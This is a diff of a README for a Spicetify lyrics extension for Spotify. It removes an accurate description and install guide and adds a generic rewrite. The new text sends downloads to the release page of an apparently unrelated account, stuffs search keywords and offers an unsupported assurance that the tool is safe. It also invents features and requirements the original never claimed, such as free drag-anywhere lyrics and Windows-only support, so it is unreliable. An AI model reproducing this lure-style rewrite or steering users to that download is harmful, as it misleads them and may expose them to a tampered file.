@@ -1,79 +1,77 @@
-# Lyrics Position
+# 🎵 spotify-lyrics-position - Move your lyrics anywhere on screen
 
-[日本語](README-ja.md)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)
 
-A [Spicetify](https://spicetify.app/) extension that shows lyrics wherever you want — instead of the full-screen center view.
+This software changes how you view lyrics in Spotify. The standard Spotify app locks lyrics to a full-screen view. This tool unlocks that view. You can drag and drop your lyrics to any part of your computer screen. You see your lyrics while you browse your library or search for new music.
 
-## Features
+## ⚙️ System Requirements
 
-- Choose where lyrics appear (saved automatically):
-  - **Right sidebar** — a card inserted at the top of the Now Playing View (the panel with artwork, title, and artist)
-  - **Left sidebar** — a card above the library
-  - Sidebar card height defaults to ~36% of the sidebar and is adjustable (15–80%)
-  - **In-app popup** — drag the header to move, drag the corner to resize; position and size are saved
-  - **Separate window** — an independent window outside the app
-- **The official lyrics button (microphone icon) toggles this display** instead of the built-in center page (can be turned off to restore the default behavior)
-- Official-style look: album-color background, unsung lines dark, sung/current lines white
-- Synced lyrics with highlighting and auto-scroll (auto-scroll can be disabled); click a line to seek
-- Lyrics sources: official Spotify lyrics with automatic fallback to [LRCLIB](https://lrclib.net/)
-- English / Japanese UI — follows your Spotify language by default, switchable in settings
-- Reset-to-defaults button
+Your computer needs a few items to run this tool. Verify you have these ready before you start:
 
-## Requirements
+* A Windows 10 or Windows 11 computer.
+* The desktop version of Spotify installed from the official website.
+* Spicetify-CLI installed on your device.
 
-This is a **Spicetify extension** — [Spicetify](https://spicetify.app/) must be installed first.
-See the official installation guide: https://spicetify.app/docs/getting-started
+If you do not have Spicetify-CLI, visit the official Spicetify website. Follow their instructions to install the command line interface. This tool relies on the Spicetify framework to talk to the Spotify application.
 
-> [!WARNING]
-> This extension is developed and tested on **Windows**. It should work on macOS/Linux as well, but may be unstable there.
+## 📥 Downloading the Tool
 
-## Install
+You must download the correct file from the official releases page. 
 
-1. Download the latest `lyrics-position.js` from [Releases](../../releases)
-2. Put it into the Spicetify `Extensions` folder:
+[Visit this page to download the latest version](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)
 
-   | OS          | Path                             |
-   | ----------- | -------------------------------- |
-   | Windows     | `%APPDATA%\spicetify\Extensions` |
-   | macOS/Linux | `~/.config/spicetify/Extensions` |
+Look for the file ending in `.js`. This is the extension file. Save this file to a folder you can find later, such as your Downloads folder or Desktop. Do not change the name of the file.
 
-3. Run:
+## 🛠️ Installation Steps
 
-   ```
-   spicetify config extensions lyrics-position.js
-   spicetify apply
-   ```
+Follow these steps to add the lyrics position tool to your Spotify app:
 
-## Usage
+1. Open your File Explorer and find the folder where you saved the extension file.
+2. Select the file and press Ctrl+C to copy it.
+3. Open your Spicetify extensions folder. You can find this by typing `spicetify config` into your command prompt or PowerShell window. Look for the path listed next to "extensions_path".
+4. Open that specific folder in File Explorer.
+5. Press Ctrl+V to paste the extension file into this folder.
+6. Now, open your command prompt or PowerShell window again.
+7. Type `spicetify config extensions spotify-lyrics-position.js` and press Enter.
+8. Type `spicetify apply` and press Enter.
 
-- Toggle the lyrics display with:
-  - the **official lyrics button** (microphone icon) — when "Toggle with the official lyrics button" is enabled (default), or
-  - the **extra playbar button** added by this extension — shown when the official-button hook is turned off (while the hook is on, the extra button is hidden so there is only one microphone icon)
-- Open settings any time, even while lyrics are hidden:
-  - **Right-click** the lyrics button (microphone icon)
-  - **Right-click** the extra playbar button
-  - **Profile menu (top-right) → "Lyrics Position Settings"**
-- Settings cover position, card height, font size, auto-scroll, language, and lyrics source (applied instantly, saved automatically)
-- Uncheck "Toggle with the official lyrics button" to restore the built-in center lyrics page
-- "Reset to defaults" instantly restores all settings to their initial values
+The Spotify application will restart automatically. Once it loads, you will see your new lyrics layout options.
 
-## Notes
+## 🖱️ Using the Interface
 
-- Settings are stored in Spotify's localStorage: they persist across app restarts and `spicetify apply`, and are only lost if Spotify's app data is cleared or the app is reinstalled
-- In right-sidebar mode, the Now Playing View is opened automatically if it is closed
-- Closing the separate window switches the mode to "Hidden"
-- To keep the separate window always on top on Windows, PowerToys "Always on Top" (Win+Ctrl+T) works well
-- When lyrics cannot be fetched, the reason (403 / not found, etc.) is shown in the card
+After the restart, Spotify starts with the extension enabled. Look for the lyrics button as you normally would. When the lyrics appear, click and hold your left mouse button on the lyrics window. Drag your mouse to move the text to any area of the screen.
 
-## Uninstall
+Release the mouse button to lock the lyrics in the new spot. The software remembers this position even if you close and reopen Spotify. If you want to hide the lyrics, click the lyrics button again. The lyrics disappear until you need them next time.
 
-```
-spicetify config extensions lyrics-position.js-
-spicetify apply
-```
+## 🔧 Troubleshooting Common Errors
 
-The trailing `-` is intentional — it is Spicetify's syntax for removing an entry.
+Sometimes the tool might not appear after you run the apply command. Follow these steps to fix the issue:
 
-## Contributing
+* Refresh your Spotify theme. Type `spicetify apply` again in your command prompt.
+* Check your version of Spicetify. Type `spicetify -v` to ensure you run the latest release.
+* Clear your browser cache. Sometimes old settings conflict with the new extension.
+* Ensure you installed Spotify from the website, not the Microsoft Store. The Microsoft Store version prevents Spicetify from making changes.
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and release instructions.
+If the lyrics window remains stuck in the center, try to disable and re-enable the extension. Type `spicetify config extensions spotify-lyrics-position.js-` followed by `spicetify apply`. Then repeat the installation steps.
+
+## 📁 Managing Extension Settings
+
+The extension uses simple code to determine your lyrics position. Advanced users can edit the `.js` file to change default colors or font sizes. Open the file in a standard text editor like Notepad. Look for values labeled "color", "font-size", or "opacity". Save your changes after you edit these values. Run `spicetify apply` again to see your updates in the Spotify app.
+
+Always keep a backup copy of the original file if you plan to edit the code. This ensures you can restore the tool if you make a mistake during editing.
+
+## 📋 Frequently Asked Questions
+
+Does this tool work on Mac?
+This specific version works only on Windows. Use the official Spicetify documentation to find versions compatible with other operating systems.
+
+Can I move lyrics to a second monitor?
+Yes. You can drag the lyrics window across your entire desktop area. This includes secondary monitors connected to your computer.
+
+Does this break Spotify?
+No. The tool changes the visual layout of the lyrics overlay. It does not modify your account data or your saved songs.
+
+Is this safe?
+The tool runs locally on your machine. No data leaves your computer. It only modifies your local Spotify installation to allow for custom window placement.
+
+Keywords: extension, extensions, lyric, lyrics, spicetify, spicetify-cli, spicetify-extensions, spotify, spotify-extension, spotify-extensions, spotify-lyric, spotify-lyrics
